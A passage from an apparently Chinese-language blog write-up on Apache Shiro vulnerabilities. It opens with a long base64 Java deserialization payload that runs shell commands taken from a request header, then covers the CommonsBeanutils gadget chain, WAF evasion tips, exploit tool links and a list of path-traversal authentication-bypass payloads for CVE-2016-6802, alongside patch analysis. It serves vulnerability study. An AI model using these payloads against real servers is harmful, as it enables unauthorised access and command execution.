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&quot;,</span><br><span class="line">                    &quot;Jdk8u20&quot;:&quot;rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAABzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAFSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtWwAKX2J5dGVjb2Rlc3QAA1tbQkwABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHAAAAAB/////wF1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29veTZhOTVuNkYHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb295NmE5NW42Ri5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAAQHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2nABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAAAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAzYGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUrA70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5cFQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcAAgcABAAHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcABAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8BBwBhAAD6AAUAPQAAAAQAAQA/AAEABQAAAAIABnQAA2FiY3cBAHhzcgApamF2YS5iZWFucy5iZWFuY29udGV4dC5CZWFuQ29udGV4dFN1cHBvcnS8SCDwkY+5DAMAAUkADHNlcmlhbGl6YWJsZXhyAC5qYXZhLmJlYW5zLmJlYW5jb250ZXh0LkJlYW5Db250ZXh0Q2hpbGRTdXBwb3J0V9TvxwTcciUDAAFMABRiZWFuQ29udGV4dENoaWxkUGVlcnQAKUxqYXZhL2JlYW5zL2JlYW5jb250ZXh0L0JlYW5Db250ZXh0Q2hpbGQ7eHBxAH4ADngAAAABc3IAMnN1bi5yZWZsZWN0LmFubm90YXRpb24uQW5ub3RhdGlvbkludm9jYXRpb25IYW5kbGVyVcr1DxXLfqUDAAJMAAxtZW1iZXJWYWx1ZXN0AA9MamF2YS91dGlsL01hcDtMAAR0eXBldAARTGphdmEvbGFuZy9DbGFzczt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAIZjVhNWE2MDhxAH4ABXh2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAMAAHhwdwQAAAAAeHhwdwwAAAAQP0AAAAAAAAJxAH4ABXN9AAAAAQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBxAH4AEng=&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>具体细节可以参考：<a href="https://cloud.tencent.com/developer/article/1848169">https://cloud.tencent.com/developer/article/1848169</a></p>
<p>测试如下：</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271603646.png" alt="image-20220927160342383"></p>
<p>最开始的时候，利用一键利用工具发现可以命令执行（当时是没有引入cc依赖的），但是利用链上是显示利用的<code>Commons Beanutils</code>链，那么下面就分析下这个<code>Commons Beanutils</code>链为什么可以利用成功，前面有截图说明了Shiro是自带<code>Apache Commons Beanutils</code>这个包的，那么能触发反序列化，就离不开这个包的一些功能特性：</p>
<blockquote>
<p><code>Commons Beanutils</code>是应用于<code>JavaBean</code>的工具</p>
<p>而<code>Commons Beanutils</code>中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意<code>JavaBean</code>的<code>getter</code>方法。</p>
<p>比如一个类<code>User</code>是个<code>JavaBean</code>，它有个<code>name</code>属性，则<code>PropertyUtils.getProperty(new Usesr(),&quot;name&quot;)</code>则会调用它的<code>getName()</code>方法。</p>
<p>在构造cc链中有遇过<code>TemplateImpl</code>类，它有一个<code>getOutputProperties</code>方法可以触发字节码加载，如果我们可以通过反序列化的点直接或间接让其调用<code>PropertyUtils.getProperty(new TemplateImpl(),&quot;OutputProperties&quot;)</code>，那就可以RCE。</p>
</blockquote>
<p>在<code>commons-beanutils-1.7.0.jar!\org\apache\commons\beanutils\BeanComparator.class</code>中存在一个<code>compare</code>方法，这个<code>compare</code>方法可以自动调用<code>PropertyUtils.getProperty</code>方法，看到<code>compare</code>方法是不是感觉在cc链中碰到过，因此这里可以拼接上cc2链的前半段使其走到<code>compare</code>方法，触发RCE</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271639643.png" alt="image-20220927163911565"></p>
<p>整个调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                BeanComparator.compare()</span><br><span class="line">                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                        TemplatesImpl.newTransformer()</span><br><span class="line">                            TemplatesImpl.getTransletInstance()</span><br><span class="line">                                TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                    TransletClassLoader.defineClass()</span><br><span class="line">                                           newInstance()</span><br><span class="line">                                         Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span><br></pre></td></tr></table></figure>

<p>还是在前面的漏洞利用工具上，利用链显示的是<code>CommonsBeanutils183</code>，这里的183表示的是cb的版本号，如果碰到cb链反序列化失败的情况，那就有可能是工具中的cb的版本和漏洞环境的不一致，导致的反序列化失败，失败的原因可能是 <code>serialVersionUID</code>的问题，可以参考：<a href="https://blog.csdn.net/whq12789/article/details/88031965">https://blog.csdn.net/whq12789/article/details/88031965</a></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271653421.png" alt="image-20220927165337284"></p>
<p>在打hvv期间，碰到很多存在shiro的站，但是上工具探测密钥和利用链的时候可能回碰到被WAF拦截的情况，那这个时候我们有没有可以绕过的办法呢，可以参考如下几点：</p>
<ul>
<li>修改请求方式，如修改GET&#x2F;POST，使用未知HTTP请求绕过，如AAA</li>
<li>在payload中添加特殊字符，比如空格，tab，^，………..，%%%%</li>
<li>将请求方式和rememberMe修改为其他字符串</li>
</ul>
<p>具体的细节可以参考：<a href="https://mp.weixin.qq.com/s/m6eHtxGTMK4igNQcMpqxaw">https://mp.weixin.qq.com/s/m6eHtxGTMK4igNQcMpqxaw</a></p>
<p>在实战中我们使用工具会加快我们的效率，有很多优秀的利用工具可以使用：</p>
<p><a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></p>
<p><a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p>
<p><a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
<p><a href="https://github.com/pmiaowu/BurpShiroPassiveScan">https://github.com/pmiaowu/BurpShiroPassiveScan</a></p>
<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Shiro 在 1.2.5 的更新 <a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a> 中针对此漏洞进行了修复，应用程序需要用户手动配置一个 cipherKey，如果不设置，将会生成一个新 key。但是如果cipherKey泄露给攻击者，那么还是会存在遭受反序列化攻击的可能。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271739907.png" alt="image-20220927173947660"></p>
<h3 id="CVE-2016-6802"><a href="#CVE-2016-6802" class="headerlink" title="CVE-2016-6802"></a>CVE-2016-6802</h3><h4 id="漏洞信息-3"><a href="#漏洞信息-3" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6802">CVE-2016-6802</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-07814">CNVD-2016-07814</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.3.2</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">Shiro 使用非根 servlet 上下文路径中存在安全漏洞。远程攻击者通过构造的请求， 利用此漏洞可绕过目标 servlet 过滤器并获取访问权限。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">绕过 | Context Path | 非根 | &#x2F;x&#x2F;..&#x2F;</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit-b15ab92</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://www.cnblogs.com/backlion/p/14055279.html">https://www.cnblogs.com/backlion/p/14055279.html</a></td>
</tr>
</tbody></table>
<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>接着用CVE-2010-3863的环境，改下shiro的依赖防止和CVE-2010-3863漏洞的利用重复了，因为这个漏洞涉及项目路径，所以在springboot的配置文件中配置下项目访问的路径：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">server.servlet.context-path=/myshiro</span></span><br></pre></td></tr></table></figure>

<p>配置好后，访问<code>/myshiro/secret.html</code>显示302跳转登录</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271814640.png" alt="image-20220927181448518"></p>
<p>利用poc绕过权限校验，访问<code>/x/../myshiro/secret.html</code>绕过成功</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271819272.png" alt="image-20220927181907126"></p>
<p>一般碰到权限校验的我都会用下我的字典跑下，看看有没有其他的payload可以绕过：</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271821480.png" alt="image-20220927182153307"></p>
<p>整理下可用的payload，其实和CVE-2010-3863的payload差不多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/;/myshiro/secret.html</span><br><span class="line">/./myshiro/secret.html</span><br><span class="line">/a.ico/../myshiro/secret.html</span><br><span class="line">/%2e/myshiro/secret.html</span><br><span class="line">/%3b/../myshiro/secret.html</span><br><span class="line">/;%09/myshiro/secret.html</span><br><span class="line">/;%09../myshiro/secret.html</span><br><span class="line">/;%2F../myshiro/secret.html</span><br></pre></td></tr></table></figure>

<p>看到payload应该就大致明白漏洞点在哪了，CVE-2010-3863的问题是出在requestURI剔除contextPath之后的路径没有做路径标准化处理；而本次漏洞就是处在contextPath的路径没有做路径标准化处理。</p>
<h4 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>还是回到<code>WebUtils#getPathWithinApplication</code>方法，跟进<code>getContextPath</code>方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271847922.png" alt="image-20220927184759844"></p>
<p>调用<code>HttpServletRequestWrapper#getContextPath</code>方法获取<code>contextPath</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271848022.png" alt="image-20220927184845926"></p>
<p>继续一路跟进来到<code>tomcat-embed-core-9.0.65.jar!\org\apache\catalina\connector\Request.class#getContextPath</code>方法</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271850089.png" alt="image-20220927185010974"></p>
<p>首先会获取第二个 “&#x2F;“的位置，然后进行截取比如：<code>/x/../myshiro/secret.html</code>截取得到 <code>/x</code>，然后做路径标准化处理（做法如CVE-2010-3863的处理），这里可以看到的出来它会循环获取”&#x2F;“的位置，下一次就是截取到 <code>/x/..</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271851254.png" alt="image-20220927185139169"></p>
<p>然后将截取到的路径 <code>/x</code> 与 <code>context path</code>进行比对，这里 <code>context path</code>即为项目路径 <code>/myshiro</code>， <code>/x</code> 和 <code>/myshiro</code>发现不匹配，就会获取下一个”&#x2F;“的位置，即上面的 <code>/x/..</code>，然后继续匹配</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271854943.png" alt="image-20220927185426755"></p>
<p>最后当截取的路径为 <code>/x/../myshiro</code>经过路径标准化处理后得到 <code>/myshiro</code>与之匹配，然后返回 <code>uri.substring(0, pos)</code>的结果即为 <code>/x/../myshiro</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271859384.png" alt="image-20220927185916222"></p>
<p>返回之后回到<code>getPathWithinApplication</code>方法中，判断<code>requestUri</code>的开头是否是<code>contextPath</code>，显然是<code>false</code>，直接返回<code>requestUri</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209280941075.png" alt="image-20220928094139942"></p>
<p>而后与pathPattern进行匹配，最后匹配不上就走的<code>/**</code>规则</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209280945439.png" alt="image-20220928094544368"></p>
<h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Shiro 在 1.3.2 版本更新中 <a href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit-b15ab92</a> 中针对此漏洞进行了修复。修复方式和 CVE-2010-3863 一样，使用路径标准化方法 <code>normalize</code> 来处理 Context Path。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281001651.png" alt="image-20220928100114414"></p>
<h3 id="CVE-2019-12422"><a href="#CVE-2019-12422" class="headerlink" title="CVE-2019-12422"></a>CVE-2019-12422</h3><h4 id="漏洞信息-4"><a href="#漏洞信息-4" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
<thead>
<tr>
<th align="left">漏洞信息</th>
<th align="left">详情</th>
</tr>
</thead>
<tbody><tr>
<td align="left">漏洞编号</td>
<td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12422">CVE-2019-12422</a> &#x2F; <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-42574">CNVD-2016-07814</a> &#x2F; <a href="https://issues.apache.org/jira/browse/SHIRO-721">SHIRO-721</a></td>
</tr>
<tr>
<td align="left">影响版本</td>
<td align="left">shiro &lt; 1.4.2 (1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1)</td>
</tr>
<tr>
<td align="left">漏洞描述</td>
<td align="left">RememberMe Cookie 默认通过 AES-128-CBC 模式加密，这种加密方式容易受到 Padding Oracle Attack 攻击，攻击者利用有效的 RememberMe Cookie 作为前缀， 然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击。</td>
</tr>
<tr>
<td align="left">漏洞关键字</td>
<td align="left">反序列化 | RememberMe | Padding | CBC</td>
</tr>
<tr>
<td align="left">漏洞补丁</td>
<td align="left"><a href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a></td>
</tr>
<tr>
<td align="left">相关链接</td>
<td align="left"><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data">https://blog.skullsecurity.org/2016/12</a> <a href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/</a> <a href="https://codeantenna.com/a/OwWV5Ivtsi">https://codeantenna.com/a/OwWV5Ivtsi</a></td>
</tr>
